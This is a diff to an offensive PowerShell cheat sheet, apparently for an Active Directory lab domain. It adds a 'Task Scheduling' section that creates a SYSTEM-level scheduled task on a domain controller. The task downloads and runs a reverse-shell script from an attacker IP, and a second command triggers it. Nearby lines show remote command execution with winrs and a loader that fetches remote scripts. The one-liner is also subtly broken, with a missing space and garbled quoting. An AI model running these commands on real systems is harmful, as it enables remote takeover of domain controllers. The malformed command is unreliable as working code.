@@ -81,6 +81,13 @@ C:> winrs.exe -r:COMPUTER cmd
 ```powershell
 C:> Loader.exe -path http:<ip>/<file>.ps1
 ```
+### Task Scheduling
+---
+```powershell
+C:> schtasks /create /S dcorp-dc /SC Weekly /RU "NT Authority\SYSTEM" /TN "UserTASK" /TR "powershell.exe -c 'iex (New-ObjectNet.WebClient).DownloadString(''http://172.16.100.X/Invoke-PowerShellTcpEx.ps1''')'"
+
+C:> schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "UserTASK"
+```
 ### BloodHound
 ---
 
